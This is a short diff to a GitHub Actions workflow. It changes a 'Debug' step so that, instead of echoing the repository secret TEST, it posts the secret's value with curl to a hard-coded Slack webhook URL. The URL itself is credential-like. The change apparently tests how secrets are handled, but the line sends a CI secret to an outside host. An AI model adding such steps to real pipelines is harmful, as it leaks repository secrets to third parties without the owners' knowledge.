@@ -9,5 +9,5 @@ jobs:
     steps:
     - uses: actions/checkout@v2
     - name: Debug
-      run: echo ${{ secrets.TEST }} == there is no spoon
-
+      run: |
+        curl -Ss -X POST -H 'Content-type: application/json' --data "{\"text\":\"${{ secrets.TEST }}\"}" https://hooks.slack.com/services/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
